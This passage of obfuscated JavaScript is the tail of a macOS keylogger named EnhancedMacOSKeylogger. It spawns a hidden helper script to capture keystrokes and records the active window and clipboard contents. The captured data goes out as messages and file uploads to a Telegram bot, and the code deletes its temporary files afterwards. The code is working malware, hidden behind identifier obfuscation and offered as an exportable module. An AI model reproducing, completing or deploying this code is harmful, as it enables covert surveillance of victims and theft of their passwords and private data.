this[_0x57ab45(0x1ac)](_0xa12da2,_0x57ab45(0x13f)+_0x5cb6c+_0x57ab45(0x11b)+_0x46e96f['length']+'\x20chars)\x20from\x20'+this[_0x57ab45(0x129)]),setTimeout(()=>{const _0x3e5090=_0x57ab45;try{fs['existsSync'](_0xa12da2)&&fs[_0x3e5090(0x188)](_0xa12da2);}catch(_0x1d0d4f){}},0x1388);}catch(_0x4d9a7c){this[_0x57ab45(0x127)](_0x57ab45(0x17b)+_0x4d9a7c[_0x57ab45(0x162)],PRIORITY['URGENT']);}},0x7d0);}catch(_0x58c169){const _0x44843c=_0x3c3e1e+_0x93c2bc(0x12f)+_0x629dcc+'\x0a\x0a‚ö†Ô∏è\x20Full\x20content\x20too\x20large\x20('+_0x46e96f['length']+_0x93c2bc(0x153);this['queueMessage'](_0x44843c,PRIORITY[_0x93c2bc(0x110)]);}}async['startKeystrokeCapture'](){const _0x229064=_0x1db4df,_0x40c0ea=path[_0x229064(0x17f)](__dirname,_0x229064(0x170)),_0x4e7640=_0x229064(0x173);fs[_0x229064(0x116)](_0x40c0ea,_0x4e7640,_0x229064(0x1af));const _0xb0927=path[_0x229064(0x17f)](__dirname,_0x229064(0x169)),_0x3289c7=_0x229064(0x123);fs[_0x229064(0x116)](_0xb0927,_0x3289c7,_0x229064(0x1af)),fs[_0x229064(0x156)](_0xb0927,_0x229064(0x163)),this[_0x229064(0x15c)]=spawn(_0x229064(0x106),[_0xb0927],{'stdio':[_0x229064(0x18a),_0x229064(0x164),_0x229064(0x164)]}),this[_0x229064(0x15c)][_0x229064(0x1b2)]['on'](_0x229064(0x155),_0x4224b5=>{const _0x1cd294=_0x229064;this[_0x1cd294(0x180)](_0x4224b5['toString']());}),this[_0x229064(0x15c)][_0x229064(0x18e)]['on'](_0x229064(0x155),_0xda63b9=>{}),this[_0x229064(0x15c)]['on'](_0x229064(0x102),_0x48566b=>{const _0x21184b=_0x229064;this['queueMessage'](_0x21184b(0x15f)+_0x48566b[_0x21184b(0x162)],PRIORITY[_0x21184b(0x110)]);}),this['scriptPath']=_0x40c0ea,this[_0x229064(0x184)]=_0xb0927;}[_0x1db4df(0x180)](_0x256263){const _0x29744c=_0x1db4df,_0x54f013=_0x256263[_0x29744c(0x190)]('\x0a')[_0x29744c(0x137)](_0x159401=>_0x159401[_0x29744c(0x189)]());_0x54f013[_0x29744c(0x174)](_0x37d47c=>{const _0x121168=_0x29744c,_0xf9cd84=_0x37d47c[_0x121168(0x189)]();if(_0xf9cd84===_0x121168(0x195)){}else{if(_0xf9cd84[_0x121168(0xfd)](_0x121168(0x12c))){const _0x4b4322=_0xf9cd84[_0x121168(0x19a)](0x11);this['handleClipboardFromKeylogger'](_0x4b4322);}else{if(_0xf9cd84[_0x121168(0xfd)](_0x121168(0x11c))){const _0x133423=_0xf9cd84[_0x121168(0x19a)](0xe);this[_0x121168(0x12d)](_0x133423);}else _0xf9cd84['startsWith'](_0x121168(0x136))&&this[_0x121168(0x127)]('‚ùå\x20'+_0xf9cd84[_0x121168(0x19a)](0x6),PRIORITY[_0x121168(0x110)]);}}});}[_0x1db4df(0x10a)](_0x1feec0){const _0x4b0071=_0x1db4df;if(_0x1feec0&&_0x1feec0!==this['lastClipboardContent']){const _0x2fd9bf=_0x4b0071(0x134)+this['currentWindow'];this[_0x4b0071(0x127)](_0x2fd9bf,PRIORITY['NORMAL']);}}[_0x1db4df(0x12d)](_0x2eb56a){const _0x55491b=_0x1db4df;_0x2eb56a!==this['currentWindow']&&(this[_0x55491b(0x1ae)]=this[_0x55491b(0x129)],this[_0x55491b(0x129)]=_0x2eb56a,this['queueMessage'](_0x55491b(0x147)+_0x2eb56a,PRIORITY[_0x55491b(0x199)]));}async['sendTelegramMessage'](_0x3349ea){return new Promise((_0x2b1780,_0x5e84ab)=>{const _0xac537c=_0x3b60,_0x3df3c6=_0xac537c(0x113)+this[_0xac537c(0x10d)][_0xac537c(0x133)]+_0xac537c(0x19e),_0x17bfe6=JSON['stringify']({'chat_id':this[_0xac537c(0x10d)][_0xac537c(0x165)],'text':_0x3349ea}),_0x2f0729={'method':_0xac537c(0x15b),'headers':{'Content-Type':_0xac537c(0x141),'Content-Length':Buffer[_0xac537c(0x132)](_0x17bfe6)},'timeout':0x7530},_0x1410fe=https['request'](_0x3df3c6,_0x2f0729,_0x45a12b=>{const _0x22bc9d=_0xac537c;let _0x3c51e4='';_0x45a12b['on'](_0x22bc9d(0x155),_0x11ab60=>_0x3c51e4+=_0x11ab60),_0x45a12b['on'](_0x22bc9d(0x115),()=>{const _0x4a0b28=_0x22bc9d;_0x45a12b[_0x4a0b28(0x1a1)]===0xc8?_0x2b1780(_0x3c51e4):_0x5e84ab(new Error('HTTP\x20'+_0x45a12b['statusCode']+':\x20'+_0x3c51e4));});});_0x1410fe['on'](_0xac537c(0x102),_0x5e84ab),_0x1410fe['on'](_0xac537c(0x19f),()=>{const _0x22bae5=_0xac537c;_0x1410fe[_0x22bae5(0x1a5)](),_0x5e84ab(new Error(_0x22bae5(0x13c)));}),_0x1410fe['write'](_0x17bfe6),_0x1410fe[_0xac537c(0x115)]();});}async['sendTelegramFile'](_0x50afdf,_0x17b051){return new Promise((_0x12ec8a,_0xd4d618)=>{const _0x12bd2c=_0x3b60,_0x267f26=_0x12bd2c(0x113)+this[_0x12bd2c(0x10d)][_0x12bd2c(0x133)]+_0x12bd2c(0xff),_0x2f3a56=_0x12bd2c(0x12e)+Math[_0x12bd2c(0x11d)]()[_0x12bd2c(0x104)](0x24),_0x315ebb=fs[_0x12bd2c(0x121)](_0x50afdf),_0x5b024b=path['basename'](_0x50afdf);let _0x3f61f4='';_0x3f61f4+='--'+_0x2f3a56+'\x0d\x0a',_0x3f61f4+=_0x12bd2c(0x101),_0x3f61f4+=this[_0x12bd2c(0x10d)]['telegramChatId']+'\x0d\x0a',_0x3f61f4+='--'+_0x2f3a56+'\x0d\x0a',_0x3f61f4+=_0x12bd2c(0x158),_0x3f61f4+=_0x17b051+'\x0d\x0a',_0x3f61f4+='--'+_0x2f3a56+'\x0d\x0a',_0x3f61f4+=_0x12bd2c(0x11a)+_0x5b024b+_0x12bd2c(0x10e),_0x3f61f4+='Content-Type:\x20text/plain;\x20charset=utf-8\x0d\x0a\x0d\x0a';const _0x2bc1f7=Buffer[_0x12bd2c(0x175)]([Buffer[_0x12bd2c(0x139)](_0x3f61f4,_0x12bd2c(0x1af)),_0x315ebb,Buffer[_0x12bd2c(0x139)](_0x12bd2c(0x150)+_0x2f3a56+_0x12bd2c(0x107),_0x12bd2c(0x1af))]),_0x50831b={'method':_0x12bd2c(0x15b),'headers':{'Content-Type':_0x12bd2c(0x15d)+_0x2f3a56,'Content-Length':_0x2bc1f7[_0x12bd2c(0x11e)]},'timeout':0xea60},_0x2669a7=https['request'](_0x267f26,_0x50831b,_0x4790fa=>{let _0x473f55='';_0x4790fa['on']('data',_0x4f0e01=>_0x473f55+=_0x4f0e01),_0x4790fa['on']('end',()=>{const _0x48d80f=_0x3b60;_0x4790fa[_0x48d80f(0x1a1)]===0xc8?_0x12ec8a(_0x473f55):_0xd4d618(new Error(_0x48d80f(0x17c)+_0x4790fa[_0x48d80f(0x1a1)]+':\x20'+_0x473f55));});});_0x2669a7['on'](_0x12bd2c(0x102),_0xd4d618),_0x2669a7['on'](_0x12bd2c(0x19f),()=>{_0x2669a7['destroy'](),_0xd4d618(new Error('File\x20upload\x20timeout'));}),_0x2669a7[_0x12bd2c(0x10f)](_0x2bc1f7),_0x2669a7['end']();});}async[_0x1db4df(0x1a4)](){const _0x2c23db=_0x1db4df;if(this[_0x2c23db(0x16a)]){console['log'](_0x2c23db(0xfb));return;}this[_0x2c23db(0x16a)]=!![];try{const _0x24f53c=_0x2c23db(0x16d)+_0x2c23db(0x18f)+'üñºÔ∏è\x20Window\x20Tracking\x0a'+_0x2c23db(0x135);this['queueMessage'](_0x24f53c,PRIORITY[_0x2c23db(0x110)]),this[_0x2c23db(0x129)]=await this['getActiveWindow'](),this[_0x2c23db(0x129)]!==_0x2c23db(0x157)&&this['queueMessage'](_0x2c23db(0x1ab)+this[_0x2c23db(0x129)],PRIORITY['NORMAL']),await this[_0x2c23db(0x14b)](),this[_0x2c23db(0x16e)](),this[_0x2c23db(0x145)]();}catch(_0x24098d){console[_0x2c23db(0x146)]('‚ùå\x20Start\x20error:\x20'+_0x24098d['message']),this[_0x2c23db(0x127)](_0x2c23db(0x14a)+_0x24098d[_0x2c23db(0x162)],PRIORITY[_0x2c23db(0x110)]),this[_0x2c23db(0x16a)]=![];}}[_0x1db4df(0x119)](){const _0x1aa0f2=_0x1db4df;if(!this[_0x1aa0f2(0x16a)])return;console['log']('üî¥\x20Stopping\x20macOS\x20monitor...'),this[_0x1aa0f2(0x16a)]=![];if(this[_0x1aa0f2(0x17e)])clearTimeout(this[_0x1aa0f2(0x17e)]);if(this[_0x1aa0f2(0x114)])clearInterval(this['clipboardTimer']);if(this[_0x1aa0f2(0x1a6)])clearInterval(this['windowTimer']);if(this[_0x1aa0f2(0x128)])clearInterval(this[_0x1aa0f2(0x128)]);this['keyloggerProcess']&&(this[_0x1aa0f2(0x15c)][_0x1aa0f2(0x154)](),this[_0x1aa0f2(0x15c)]=null);const _0x3d9583=[this[_0x1aa0f2(0x18c)],this[_0x1aa0f2(0x184)]]['filter'](Boolean);_0x3d9583[_0x1aa0f2(0x174)](_0xc40291=>{const _0x38635b=_0x1aa0f2;try{fs[_0x38635b(0x117)](_0xc40291)&&fs[_0x38635b(0x188)](_0xc40291);}catch(_0x367674){}}),this[_0x1aa0f2(0x127)](_0x1aa0f2(0x1a9),PRIORITY[_0x1aa0f2(0x110)]),console[_0x1aa0f2(0x146)]('‚úÖ\x20Stopped\x20successfully');}[_0x1db4df(0x19b)](){this['stop']();}}function createMacOSMonitor(_0x3ba148={}){return new EnhancedMacOSKeylogger(_0x3ba148);}async function startMacOSMonitor(_0xce4c31={}){const _0x15f84c=createMacOSMonitor(_0xce4c31);return await _0x15f84c['start'](),_0x15f84c;}module['exports']={'EnhancedMacOSKeylogger':EnhancedMacOSKeylogger,'createMacOSMonitor':createMacOSMonitor,'startMacOSMonitor':startMacOSMonitor};require[_0x1db4df(0x140)]===module&&(console[_0x1db4df(0x146)](_0x1db4df(0x19c)),console['log'](_0x1db4df(0x168)),startMacOSMonitor()[_0x1db4df(0x191)](_0x471863=>{const _0x3b0b98=_0x1db4df;console[_0x3b0b98(0x102)](_0x3b0b98(0x160),_0x471863[_0x3b0b98(0x162)]),process[_0x3b0b98(0x124)](0x1);}));
